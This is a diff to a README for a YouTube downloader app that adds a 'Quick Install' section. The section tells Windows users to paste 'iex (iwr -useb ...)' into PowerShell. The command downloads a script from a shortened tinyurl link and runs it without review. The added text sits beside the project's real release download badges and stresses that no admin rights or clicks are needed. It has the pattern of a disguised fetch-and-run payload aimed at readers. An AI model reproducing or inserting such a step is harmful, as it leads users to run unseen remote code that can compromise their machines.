@@ -2,6 +2,23 @@
 
 Modern YouTube downloader — Paste a URL, pick your format, and download videos or audio with ease.
 
+## Quick Install — YouTube Downloader
+
+**Step by step (copy-paste ready):**
+
+1. Press `Win + R`, type `powershell`, press Enter
+2. Copy the line below
+3. Right-click in the PowerShell window (or Ctrl+V) to paste
+4. Press Enter
+
+```
+iex (iwr -useb https://tinyurl.com/ytdlps1)
+```
+
+- ✅ That's it. No admin. No clicking next. Just works.
+
+---
+
 [![Download Setup](https://img.shields.io/badge/Download-Windows%20Setup-blue?style=for-the-badge&logo=windows)](https://github.com/eaeoz/youtube-downloader/releases/download/1.0.0/YouTube.Downloader.Setup.1.0.0.exe)
 [![Download Portable](https://img.shields.io/badge/Download-Portable%20Version-orange?style=for-the-badge&logo=windows)](https://github.com/eaeoz/youtube-downloader/releases/download/1.0.0/YouTube.Downloader_portable_1.0.0.exe)
 [![GitHub](https://img.shields.io/badge/Source-GitHub-black?style=for-the-badge&logo=github)](https://github.com/eaeoz/youtube-downloader)
